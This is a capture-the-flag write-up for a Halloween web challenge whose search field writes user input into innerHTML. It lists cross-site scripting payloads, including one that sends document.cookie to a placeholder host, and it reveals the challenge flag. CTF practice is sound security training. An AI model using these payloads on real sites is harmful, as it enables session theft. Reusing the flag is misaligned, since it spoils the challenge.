# Phantom Script

## Description

Every Halloween, an enigmatic blog emerges from the depths of the dark web—Phantom's Script. Its pages are filled with cursed writings and hexed code that ensnare the souls of unwary visitors. The blog's malicious scripts weave dark secrets into the fabric of the internet, spreading corruption with each click. Rumor has it that interacting with the site in unexpected ways can trigger hidden incantations. Will you dare to delve into this haunted scroll, manipulate the scripts, and purge the malevolent code before it claims more victims?

> Wait for the bot to trigger your payload. It might take around ~10 seconds. 

## Challenge Objective

Your objective is to identify and the XSS vulnerability lurking in the shadows of the search feature and pop an alert box.

### Application Structure

The application consists of the following haunted components:

- **Search Feature:** This is where the cursed XSS vulnerability resides. It accepts user input and displays search results based on the query provided.
- **Articles Section:** This section contains various ghostly articles that the search feature filters through based on the user's input.
- **Cursed Code Block:** This section of the application displays the actual code responsible for rendering search results, allowing you to identify potential security flaws.

### Example Payloads

Below are a few spooky payloads to get you started:

- Basic XSS Payload:
    ```html
    <script>alert('Boo!');</script>
    ```
    ```html
    <script>fetch('[host]')</script>
    ```

- More Diabolical Payload:
    ```html
    <img src=x onerror="alert('Boo!')">
    ```
    ```html
    <img src=x onerror="fetch('[HOST]' + document.cookie)" />
    ```

### Additional Tips

- Pay attention to the haunted HTML and JavaScript code. The context in which your payload is executed will determine its effectiveness.
- Experiment with different sinister payloads to see how the application responds. Some might be blocked by ancient wards, while others may slip through.
- Use developer tools to test and debug your evil payloads.

Good luck, and beware the curse of broken code!

## Solution

![Phantom's Script.png](/assets/ctf/htb/phantom-script.png)

`Cursed Code Block`:
```js
searchInput.addEventListener('input', function () {
    const query = searchInput.value;
    if (query.trim() !== "") {
        const filteredArticles = filterArticles(query);
        searchResultsHeading.innerHTML = `Results for: "${query}"`;
        searchResultsHeading.style.display = 'block';
        renderArticles(filteredArticles);
    } else {
        searchResultsHeading.style.display = 'none';
        renderArticles(articles);
    }
});
```

Because of `innerHTML` we are able to inject html into the website:

![Phantom's Script-1.png](/assets/ctf/htb/phantom-script-1.png)

Objective is to pop an `alert`:
```html
<img src=x onerror=alert(1) />
```

After few seconds we get flag:

![Phantom's Script-2.png](/assets/ctf/htb/phantom-script-2.png)

> Flag: `HTB{xSS-1S_E4SY_wh4t_d0_y0u_th1nk?_0fecfbf221be3ef89cf8e5007eda4836}`